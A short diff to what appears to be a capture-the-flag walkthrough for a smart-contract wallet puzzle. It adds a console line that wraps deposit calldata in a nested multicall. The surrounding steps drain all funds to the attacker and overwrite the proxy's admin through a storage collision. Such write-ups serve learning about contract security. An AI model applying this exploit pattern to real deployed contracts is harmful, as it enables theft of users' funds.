@@ -17,5 +17,6 @@
 - use `execute` to withdraw all funds to attacker
 ### Step 3 console code
 - `depositData = await contract.methods["deposit()"].request().then(value => value.data)`
+- `multicallDepositData = await contract.methods["multicall(bytes[])"].request([depositData]).then(value => value.data)`
 
 4. Use `setMaxBalance` to set value of `admin` in proxy to attacker
